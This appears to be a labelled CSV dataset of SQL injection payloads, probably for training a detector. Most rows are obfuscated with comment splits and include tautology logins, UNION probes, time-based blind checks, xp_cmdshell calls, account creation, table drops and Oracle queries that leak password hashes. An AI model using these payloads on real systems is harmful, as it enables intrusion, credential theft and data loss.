Query,Label
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  column_name  )   FRO/**/M   (  SE/**/LECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LI/**/MIT FR/**/OM all_tab_columns  )   WH/**/ERE LIMI/**/T  =  7   )    )    AN/**/D 'i'  =  'i",1
&apos; O/**/R,1
sqlvuln;,1
sel/**/ect * f/**/rom users wher/**/e id  =  1 + $+%$ o/**/r 1  =  1 -- 1,1
sele/**/ct * fro/**/m users w/**/here id  =  '1' + $+%\ o/**/r 1  =  1 -- 1',1
""" o/**/r """"*""",1
"hi o/**/r 1  =  1 --""",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1. unio/**/n selec/**/t nu/**/ll,banner fro/**/m v$version whe/**/re rownum  =  1 -- 1",1
; exec master..xp_cmdshell 'pi/**/ng 172.10.1.255'--,1
" selec/**/t * f/**/rom users wher/**/e id  =  '1' o/**/r 1^  =  1 uni/**/on sele/**/ct 1,banner fro/**/m v$version w/**/here rownum  =  1 -- 1'",1
" selec/**/t * fr/**/om users w/**/here id  =  '1' uni/**/on se/**/lect ""?""_,version  (    )   -- 1'",1
se/**/lect * fr/**/om i/**/nfo/**/rmation_schema.tab/**/les--,1
sele/**/ct * fro/**/m users whe/**/re id  =  1 o/**/r \<\. o/**/r 1  =  1 -- 1,1
   (  se/**/lect top 1,1
Ã½ o/**/r 1  =  1 --,1
a' --,1
 o/**/r 1  =  1 /*,1
" s/**/elect * f/**/rom users wh/**/ere id  =  1 o/**/r 1#"", u/**/nion sele/**/ct nu/**/ll,version  (    )   -- 1",1
" sel/**/ect * f/**/rom users whe/**/re id  =  '1' u/**/nion sele/**/ct $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlogi/**/n 'name' , 'passwo/**/rd'",1
" se/**/lect * fr/**/om users whe/**/re id  =  1   uni/**/on sele/**/ct n/**/ull,banner f/**/rom v$version whe/**/re rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" selec/**/t * fro/**/m users whe/**/re id  =  1 o/**/r "".  )  "" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users w/**/here id  =  1 o/**/r @<@  =  1 u/**/nion sel/**/ect 1,version  (    )   -- 1",1
group b/**/y userid havi/**/ng 1  =  1--,1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 + \+%1 unio/**/n sel/**/ect n/**/ull,@@VERSION -- 1",1
selec/**/t * f/**/rom users wher/**/e id  =  1 *1 o/**/r 1  =  1 -- 1,1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r @#"";  =  1 o/**/r 1  =  1 -- 1",1
‘ o/**/r 1  =  1 --,1
" selec/**/t * f/**/rom users whe/**/re id  =  1 *\. u/**/nion sele/**/ct nu/**/ll,@@VERSION -- 1",1
sel/**/ect * f/**/rom users wh/**/ere id  =  1 %  (  @  )   o/**/r 1  =  1 -- 1,1
o/**/r 'a'  =  'a,1
declare @s varchar  (  22  )   selec/**/t @s   = ,1
" selec/**/t * fr/**/om users wh/**/ere id  =  1 unio/**/n selec/**/t 1<@,version  (    )   -- 1",1
" se/**/lect * fro/**/m users w/**/here id  =  1 + \+*\ unio/**/n s/**/elect nu/**/ll,@@VERSION -- 1",1
" selec/**/t * f/**/rom users w/**/here id  =  1 o/**/r 1#"". unio/**/n se/**/lect version  (    )  ,version  (    )   -- 1",1
@variable,1
; exec master..xp_cmdshell,1
se/**/lect * f/**/rom users whe/**/re id  =  1 +  (  1  )   o/**/r 1  =  1 -- 1,1
" sele/**/ct * fr/**/om users wher/**/e id  =  1 u/**/nion se/**/lect @ 1$,version  (    )   -- 1",1
" s/**/elect * f/**/rom users wh/**/ere id  =  1 uni/**/on sel/**/ect @ 1a,version  (    )   -- 1",1
" se/**/lect * fro/**/m users wher/**/e id  =  1 o/**/r  @$#  =  1 un/**/ion se/**/lect 1,version  (    )   -- 1",1
" sel/**/ect * fro/**/m users w/**/here id  =  '1' o/**/r   (  \.  )    =  1 unio/**/n se/**/lect 1,@@VERSION -- 1'",1
 an/**/d 1 i/**/n   (  sel/**/ect var f/**/rom temp  )  --,1
" sel/**/ect * f/**/rom users wh/**/ere id  =  '1' un/**/ion s/**/elect 1""!"",banner fr/**/om v$version whe/**/re rownum  =  1 -- 1'",1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r ""1]"" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users wh/**/ere id  =  1 o/**/r ""$?"" o/**/r 1  =  1 -- 1",1
o/**/r x  =  x,1
o/**/r a  =  a,1
o/**/r '1'  =  '1,1
" s/**/elect * fr/**/om users wher/**/e id  =  11<1# uni/**/on sel/**/ect 1,version  (    )   -- 1",1
   )    )    o/**/r    (    (   'x'   )    )     =     (    (   'x,1
" selec/**/t * fro/**/m users wh/**/ere id  =  '1' o/**/r \.<1 unio/**/n selec/**/t 1,@@VERSION -- 1'",1
" se/**/lect * f/**/rom users wher/**/e id  =  '1' <@&1 u/**/nion se/**/lect 1,version  (    )   -- 1'",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  ta/**/ble_name  )   FRO/**/M   (  SELEC/**/T DI/**/STI/**/NCT  (  t/**/able_name  )  , ROWNUM AS LIM/**/IT F/**/ROM sys.all_tabl/**/es  )   W/**/HERE LIM/**/IT  =  4   )    )    AN/**/D 'i'  =  'i",1
; if i/**/s_srvrolemember  (  'sysadmi/**/n'  )   > 0 waitfo/**/r delay '0:0:2' --,1
se/**/lect * fro/**/m users wh/**/ere id  =  1 <@<@ o/**/r 1  =  1 -- 1,1
" se/**/lect * fro/**/m users wher/**/e id  =  1 uni/**/on sel/**/ect @<@$,version  (    )   -- 1",1
" se/**/lect * fro/**/m users whe/**/re id  =  '1' <@<@ unio/**/n sel/**/ect 1,version  (    )   -- 1'",1
" s/**/elect * fro/**/m users w/**/here id  =  1 o/**/r ""$_"" o/**/r 1  =  1 -- 1",1
" se/**/lect * f/**/rom users whe/**/re id  =  1 o/**/r 1#""{ unio/**/n sel/**/ect version  (    )  ,version  (    )   -- 1",1
a' o/**/r 1  =  1--,1
 )   o/**/r   (  a  =  a,1
"""   )    )    o/**/r    (    (   ""x""   )    )     =     (    (   ""x",1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r 1#""; o/**/r 1  =  1 -- 1",1
" sele/**/ct * f/**/rom users w/**/here id  =  '1' <@$_ u/**/nion s/**/elect 1,version  (    )   -- 1'",1
-- &passwo/**/rd  = ,1
se/**/lect * f/**/rom users wh/**/ere id  =  1 <@. o/**/r 1  =  1 -- 1,1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r ""  (    )  "" o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users w/**/here id  =  1 %$ 1 uni/**/on sele/**/ct nul/**/l,@@VERSION -- 1",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  granted_role  )   FRO/**/M   (  S/**/ELECT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LIM/**/IT FRO/**/M dba_role_privs W/**/HERE GRANTEE  =  SYS.LOGI/**/NUSER  )   WH/**/ERE LIM/**/IT  =  3   )    )    AN/**/D 'i'  =  'i",1
 o/**/r '1'  =  '1,1
admi/**/n' o/**/r 1  =  1,1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r "";,""  =  1 o/**/r 1  =  1 -- 1",1
" selec/**/t * f/**/rom users whe/**/re id  =  1 unio/**/n selec/**/t @||1,version  (    )   -- 1",1
" sele/**/ct * f/**/rom users w/**/here id  =  1 +\+. u/**/nion selec/**/t nu/**/ll,@@VERSION -- 1",1
" s/**/elect * fr/**/om users wher/**/e id  =  1 o/**/r ""  )  ,"" o/**/r 1  =  1 -- 1",1
" u/**/nion sele/**/ct * fro/**/m users whe/**/re logi/**/n   =   char  (  114,111,111,116  )  ;",1
" sel/**/ect * f/**/rom users w/**/here id  =  1 o/**/r 1#""? uni/**/on selec/**/t 1,version  (    )   -- 1",1
 o/**/r 1  =  1--,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  granted_role  )   FRO/**/M   (  SEL/**/ECT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LI/**/MIT F/**/ROM dba_role_privs W/**/HERE GRANTEE  =  SYS.LOGI/**/NUSER  )   WH/**/ERE LI/**/MIT  =  5   )    )    A/**/ND 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ o/**/r 3  =  3 --,1
" se/**/lect * fr/**/om users whe/**/re id  =  1 -1<@ unio/**/n sel/**/ect 1,version  (    )   -- 1",1
" se/**/lect * fro/**/m users whe/**/re id  =  1 o/**/r ""$#"" o/**/r 1  =  1 -- 1",1
 )   uni/**/on sele/**/ct * f/**/rom i/**/nfo/**/rmation_schema.ta/**/bles;,1
" s/**/elect * f/**/rom users whe/**/re id  =  1 o/**/r ""  )  ]"" o/**/r 1  =  1 -- 1",1
"  )   o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT COUNT  (  DI/**/STI/**/NCT  (  column_name   )    )    F/**/ROM sys.all_tab_columns   )    )    AN/**/D 'i'  =  'i,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  ta/**/ble_name  )   FR/**/OM   (  SE/**/LECT DI/**/STI/**/NCT  (  ta/**/ble_name  )  , ROWNUM AS LIM/**/IT F/**/ROM sys.all_ta/**/bles  )   WHE/**/RE LIM/**/IT  =  7   )    )    A/**/ND 'i'  =  'i",1
""" o/**/r """" """,1
delet/**/e,1
;waitfo/**/r delay '0:0:__TIME__'--,1
 o/**/r 1  =  1 --,1
1' an/**/d non_exi/**/stant_tab/**/le   =   '1,1
" sel/**/ect * fr/**/om users whe/**/re id  =  1 o/**/r ""&  )  "" o/**/r 1  =  1 -- 1",1
" se/**/lect * fro/**/m users w/**/here id  =  '1' + $ . u/**/nion sel/**/ect 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   sele/**/ct @s   =   0x77616974 ...,1
x' A/**/ND userid I/**/S NU/**/LL; --,1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r "";["" o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users wh/**/ere id  =  '1' o/**/r \.<   =  1 un/**/ion selec/**/t 1,@@VERSION -- 1'",1
" sele/**/ct * f/**/rom users whe/**/re id  =  1 unio/**/n selec/**/t @<@,version  (    )   -- 1",1
" se/**/lect * fr/**/om users w/**/here id  =  1 -@<@ un/**/ion se/**/lect 1,version  (    )   -- 1",1
 AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T host_name FRO/**/M v$i/**/nstance   )    )    A/**/ND 'i'  =  'i,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  column_name  )   F/**/ROM   (  SELEC/**/T DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIMI/**/T FR/**/OM all_tab_columns  )   WHER/**/E LI/**/MIT  =  2   )    )    AN/**/D 'i'  =  'i",1
se/**/lect * fr/**/om users whe/**/re id  =  1 +   (  \+  )   o/**/r 1  =  1 -- 1,1
" sele/**/ct * fr/**/om users wh/**/ere id  =  1 o/**/r "".["" o/**/r 1  =  1 -- 1",1
" selec/**/t * fr/**/om users w/**/here id  =  1 o/**/r ""  (  ["" o/**/r 1  =  1 -- 1",1
UNI/**/ON ALL SEL/**/ECT,1
" sel/**/ect * fr/**/om users whe/**/re id  =  1 o/**/r ""1#"" o/**/r 1  =  1 -- 1",1
sele/**/ct * f/**/rom users w/**/here id  =  1 o/**/r \<1 o/**/r 1  =  1 -- 1,1
" sel/**/ect * f/**/rom users wher/**/e id  =  1 | |1 uni/**/on selec/**/t 1,banner f/**/rom v$version w/**/here rownum  =  1 -- 1",1
x' o/**/r full_name l/**/ike '%bob%,1
x' a/**/nd members.email i/**/s NUL/**/L; --,1
 o/**/r 2 > 1,1
sel/**/ect * fro/**/m users wh/**/ere id  =  1.*1 o/**/r 1  =  1 -- 1,1
"""  )   o/**/r pg_sleep  (  __TIME__  )  --",1
 ',1
" se/**/lect * fr/**/om users wher/**/e id  =  1 o/**/r $<\. unio/**/n s/**/elect 1,@@VERSION -- 1",1
" sel/**/ect * f/**/rom users wher/**/e id  =  1 o/**/r ""@  )  "" o/**/r 1  =  1 -- 1",1
se/**/lect * f/**/rom users whe/**/re id  =  1 o/**/r \.<$ o/**/r 1  =  1 -- 1,1
 )   o/**/r sleep  (  __TIME__  )    =  ',1
sleep 50',1
" sele/**/ct * fro/**/m users wh/**/ere id  =  '1' + 1||1 un/**/ion sel/**/ect 1,banner fr/**/om v$version wher/**/e rownum  =  1 -- 1'",1
sel/**/ect * fr/**/om users whe/**/re id  =  1 + $+%\ o/**/r 1  =  1 -- 1,1
" s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r "";  (  "" o/**/r 1  =  1 -- 1",1
o/**/r sleep  (  __TIME__  )    =  ',1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r "";_"" o/**/r 1  =  1 -- 1",1
" s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r 1#"". unio/**/n s/**/elect 1,version  (    )   -- 1",1
" sele/**/ct * fro/**/m users whe/**/re id  =  1 un/**/ion sel/**/ect  @ $,version  (    )   -- 1",1
" s/**/elect * fro/**/m users wher/**/e id  =  1 un/**/ion s/**/elect +!<@,version  (    )   -- 1",1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 <@<@ u/**/nion sele/**/ct nul/**/l,version  (    )   -- 1",1
o/**/r 2 > 1,1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
anythi/**/ng' O/**/R 'x'  =  'x,1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r \<\ u/**/nion s/**/elect 1,@@VERSION -- 1",1
" selec/**/t * f/**/rom users wher/**/e id  =  1 unio/**/n selec/**/t   (  1  )  ,banner fro/**/m v$version wh/**/ere rownum  =  1 -- 1",1
" sel/**/ect * fro/**/m users wher/**/e id  =  1 *  (  \  )   uni/**/on s/**/elect nu/**/ll,@@VERSION -- 1",1
&',1
a' o/**/r 3  =  3--,1
" s/**/elect * fr/**/om users wh/**/ere id  =  '1' o/**/r $+<$ uni/**/on se/**/lect 1,@@VERSION -- 1'",1
" se/**/lect * f/**/rom users whe/**/re id  =  1 +1 unio/**/n s/**/elect 1,banner fr/**/om v$version wh/**/ere rownum  =  1 -- 1",1
"admi/**/n""o/**/r 1  =  1 o/**/r """"  =  """,1
uni/**/on sel/**/ect,1
""" o/**/r """"&""",1
 )    )   ;waitfo/**/r delay '0:0:__TIME__'--,1
" selec/**/t * f/**/rom users whe/**/re id  =  1 o/**/r ""?;"" o/**/r 1  =  1 -- 1",1
1 waitfo/**/r delay '0:0:10'--,1
bfilename,1
admi/**/n'  )   o/**/r   (  '1'  =  '1'--,1
UEf,1
 -- &passwo/**/rd  = ,1
1 o/**/r sleep  (  __TIME__  )  #,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  ta/**/ble_name  )   FR/**/OM   (  S/**/ELECT DI/**/STI/**/NCT  (  tab/**/le_name  )  , ROWNUM AS L/**/IMIT FRO/**/M sys.all_ta/**/bles  )   WHE/**/RE LIM/**/IT  =  6   )    )    AN/**/D 'i'  =  'i",1
" sele/**/ct * fro/**/m users wh/**/ere id  =  '1' unio/**/n selec/**/t $[""],@@VERSION -- 1'",1
" sel/**/ect * fr/**/om users wher/**/e id  =  '1' + @  (  1  )   u/**/nion sel/**/ect 1,version  (    )   -- 1'",1
1' an/**/d 1  =    (  sel/**/ect count  (  *  )   fro/**/m t/**/ablenames  )  ; --,1
o/**/r sleep  (  __TIME__  )  #,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  granted_role  )   FRO/**/M   (  SELE/**/CT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LI/**/MIT FR/**/OM dba_role_privs WHER/**/E GRANTEE  =  SYS.LOGI/**/NUSER  )   W/**/HERE LI/**/MIT  =  8   )    )    AN/**/D 'i'  =  'i",1
" s/**/elect * fro/**/m users w/**/here id  =  1 o/**/r 1#"",  =  1 o/**/r 1  =  1 -- 1",1
||6,1
o/**/r 1/*,1
" an/**/d 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
se/**/lect * f/**/rom users w/**/here id  =  1.%@ o/**/r 1  =  1 -- 1,1
" sele/**/ct * fro/**/m users whe/**/re id  =  1 o/**/r ""..""  =  1 o/**/r 1  =  1 -- 1",1
" sele/**/ct * f/**/rom users whe/**/re id  =  1 o/**/r 1&@#  =  1 unio/**/n sel/**/ect 1,version  (    )   -- 1",1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 o/**/r "";]"" o/**/r 1  =  1 -- 1",1
" o/**/r 1  =  1 o/**/r """"  =  ",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  SEL/**/ECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIMI/**/T FRO/**/M SYS.USER$  )   WH/**/ERE L/**/IMIT  =  7   )    )    AN/**/D 'i'  =  'i",1
s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r $<\. o/**/r 1  =  1 -- 1,1
" selec/**/t * f/**/rom users wher/**/e id  =  1 *  (  1  )   un/**/ion s/**/elect 1,banner f/**/rom v$version wher/**/e rownum  =  1 -- 1",1
o/**/r 'whatever' i/**/n   (  'whatever'  ) ,1
declare @s varchar   (  200  )   sele/**/ct @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
sel/**/ect * fro/**/m users whe/**/re id  =  '1'   o/**/r 1  =  1 -- 1',1
?,1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT COUNT  (  DI/**/STI/**/NCT  (  tab/**/le_name   )    )    F/**/ROM sys.all_tabl/**/es   )    )    AN/**/D 'i'  =  'i,1
" sel/**/ect * fr/**/om users w/**/here id  =  '1' un/**/ion selec/**/t @ 1,version  (    )   --  1'",1
"admi/**/n""  )   o/**/r   (  ""1""  =  ""1""#",1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 o/**/r 1#"", un/**/ion selec/**/t 'a',version  (    )   -- 1",1
" se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""$  (  "" o/**/r 1  =  1 -- 1",1
 o/**/r '' ',1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r "";#"" o/**/r 1  =  1 -- 1",1
o/**/r 1  =  1,1
 ; dro/**/p tabl/**/e temp --,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FR/**/OM   (  SELE/**/CT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIM/**/IT FR/**/OM SYS.USER$  )   W/**/HERE LIMI/**/T  =  2   )    )    AN/**/D 'i'  =  'i",1
""" o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
""" o/**/r ""x""  =  ""x",1
sel/**/ect * fro/**/m users wher/**/e id  =  '1'<@.. o/**/r 1  =  1 -- 1',1
" se/**/lect * fro/**/m users wh/**/ere id  =  1 o/**/r !<@ unio/**/n selec/**/t 1,version  (    )   -- 1",1
 o/**/r 'somethi/**/ng' li/**/ke 'some%',1
; if no/**/t   (    (   se/**/lect serverproperty  (  'i/**/si/**/ntegratedsecurityonly'   )    )    <> 0  )   waitfo/**/r delay '0:0:2' --,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FR/**/OM   (  S/**/ELECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LI/**/MIT FRO/**/M SYS.USER$  )   W/**/HERE LI/**/MIT  =  4   )    )    A/**/ND 'i'  =  'i",1
s/**/elect * fr/**/om users whe/**/re id  =  '1' o/**/r \<\. o/**/r 1  =  1 -- 1',1
; exec master..xp_cmdshell 'pi/**/ng 10.10.1.2'--,1
admi/**/n' o/**/r '1'  =  '1'--,1
; if no/**/t   (    (   sel/**/ect serverproperty  (  'i/**/si/**/ntegratedsecurityonly'   )    )    <> 1  )   waitfo/**/r delay '0:0:2' --,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  tab/**/le_name  )   FR/**/OM   (  S/**/ELECT DI/**/STI/**/NCT  (  tab/**/le_name  )  , ROWNUM AS LIM/**/IT FRO/**/M sys.all_t/**/ables  )   W/**/HERE L/**/IMIT  =  2   )    )    A/**/ND 'i'  =  'i",1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 <@<@ u/**/nion selec/**/t version  (    )  ,version  (    )   -- 1",1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r 1#""$ unio/**/n sele/**/ct nu/**/ll,version  (    )   -- 1",1
""";waitfo/**/r delay '0:0:__TIME__'--",1
x' an/**/d userid i/**/s NUL/**/L; --,1
sel/**/ect * fro/**/m users wher/**/e id  =  '1' *$ 1 o/**/r 1  =  1 -- 1',1
" sel/**/ect * f/**/rom users w/**/here id  =  1 o/**/r \<\ unio/**/n s/**/elect nu/**/ll,@@VERSION -- 1",1
" sel/**/ect * fr/**/om users w/**/here id  =  1 o/**/r ""?@"" o/**/r 1  =  1 -- 1",1
’ o/**/r ‘1’  =  ’1,1
" s/**/elect * fr/**/om users whe/**/re id  =  '1' uni/**/on sele/**/ct 1a,banner f/**/rom v$version wher/**/e rownum  =  1 -- 1'",1
admi/**/n'o/**/r 1  =  1 o/**/r ''  =  ',1
" se/**/lect * fr/**/om users wh/**/ere id  =  '1' o/**/r !<1 uni/**/on sel/**/ect 1,version  (    )   -- 1'",1
" a/**/nd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
exec  (  @s  ) ,1
" sel/**/ect * fr/**/om users w/**/here id  =  1 o/**/r ""_  )  "" o/**/r 1  =  1 -- 1",1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r \.<   =  1 un/**/ion se/**/lect 1,@@VERSION -- 1",1
 o/**/r 1  =  1,1
sel/**/ect * fr/**/om users wh/**/ere id  =  1 + $+%1 o/**/r 1  =  1 -- 1,1
" s/**/elect * fro/**/m users wher/**/e id  =  1.  uni/**/on sel/**/ect version  (    )  ,version  (    )   -- 1",1
x' AN/**/D email I/**/S NU/**/LL; --,1
" se/**/lect * f/**/rom users w/**/here id  =  '1' + @ @1 uni/**/on se/**/lect 1,version  (    )   -- 1'",1
 --,1
" se/**/lect * fro/**/m users whe/**/re id  =  '1'   unio/**/n s/**/elect nu/**/ll,banner f/**/rom v$version wher/**/e rownum  =  1 -- 1'",1
" s/**/elect * f/**/rom users wh/**/ere id  =  11||1 un/**/ion s/**/elect 1,banner fr/**/om v$version wher/**/e rownum  =  1 -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id  =  1.*1 un/**/ion sel/**/ect 1,banner f/**/rom v$version wh/**/ere rownum  =  1 -- 1",1
updat/**/e,1
 o/**/r 1/*,1
" s/**/elect * f/**/rom users whe/**/re id  =  1.<1# un/**/ion s/**/elect 1,version  (    )   -- 1",1
"""   )    )    o/**/r pg_sleep  (  __TIME__  )  --",1
||'6,1
" s/**/elect * fr/**/om users wher/**/e id  =  1. <@ uni/**/on s/**/elect 1,version  (    )   -- 1",1
o/**/r   (  EXI/**/STS  ) ,1
^',1
o/**/r 'text'   =   n'text',1
" selec/**/t * fr/**/om users wh/**/ere id  =  1 + \+*$ uni/**/on selec/**/t nu/**/ll,@@VERSION -- 1",1
" sele/**/ct * fro/**/m users wh/**/ere id  =  '1' uni/**/on s/**/elect $ _,@@VERSION -- 1'",1
" s/**/elect * f/**/rom users whe/**/re id  =  1 o/**/r ""  )  ;"" o/**/r 1  =  1 -- 1",1
" selec/**/t * f/**/rom users wher/**/e id  =  1 <@1$ u/**/nion sel/**/ect 1,version  (    )   -- 1",1
 o/**/r 0  =  0 --,1
" s/**/elect * f/**/rom users wh/**/ere id  =  1 o/**/r ""{1""  =  1 o/**/r 1  =  1 -- 1",1
" se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""{,""  =  1 o/**/r 1  =  1 -- 1",1
" se/**/lect * fr/**/om users whe/**/re id  =  1 o/**/r 1#"", unio/**/n sel/**/ect version  (    )  ,version  (    )   -- 1",1
" s/**/elect * f/**/rom users wher/**/e id  =  1 o/**/r 1#""? unio/**/n se/**/lect 'a',version  (    )   -- 1",1
passwo/**/rd:*/  =  1--,1
" selec/**/t * fr/**/om users w/**/here id  =  1 <@. uni/**/on selec/**/t 1,version  (    )   -- 1",1
" s/**/elect * fr/**/om users wher/**/e id  =  1 o/**/r ""  )  @"" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users w/**/here id  =  '1' uni/**/on se/**/lect @ @1,version  (    )   --  1'",1
" unio/**/n   (  s/**/elect NU/**/LL,   (  sele/**/ct @@version   )    )    --",1
" se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""  )  {"" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id  =  1.<@. unio/**/n selec/**/t 1,version  (    )   -- 1",1
" sele/**/ct * f/**/rom users w/**/here id  =  1 +\. un/**/ion sele/**/ct nu/**/ll,@@VERSION -- 1",1
" se/**/lect * fro/**/m users wher/**/e id  =  1 + @<@. uni/**/on selec/**/t 1,version  (    )   -- 1",1
" s/**/elect * f/**/rom users wh/**/ere id  =  1 o/**/r \<$ unio/**/n sele/**/ct 1,@@VERSION -- 1",1
" selec/**/t * f/**/rom users wh/**/ere id  =  1 o/**/r   (  $+  )    =  1 un/**/ion sel/**/ect 1,@@VERSION -- 1",1
" selec/**/t * f/**/rom users wh/**/ere id  =  1 +   (  \+  )   uni/**/on selec/**/t n/**/ull,@@VERSION -- 1",1
" sele/**/ct * f/**/rom users w/**/here id  =  1. unio/**/n sele/**/ct nul/**/l,version  (    )   -- 1",1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 o/**/r ""  )  ["" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fro/**/m users w/**/here id  =  1 o/**/r \.<1 uni/**/on selec/**/t 1,@@VERSION -- 1",1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT banner FR/**/OM v$version WHE/**/RE ROWNUM  =  1   )    )    AN/**/D 'i'  =  'i,1
se/**/lect * fro/**/m users w/**/here id  =  1 <@$_ o/**/r 1  =  1 -- 1,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  column_name  )   F/**/ROM   (  S/**/ELECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIM/**/IT FR/**/OM all_tab_columns  )   WH/**/ERE LIM/**/IT  =  3   )    )    A/**/ND 'i'  =  'i",1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r $+<$ unio/**/n sel/**/ect 1,@@VERSION -- 1",1
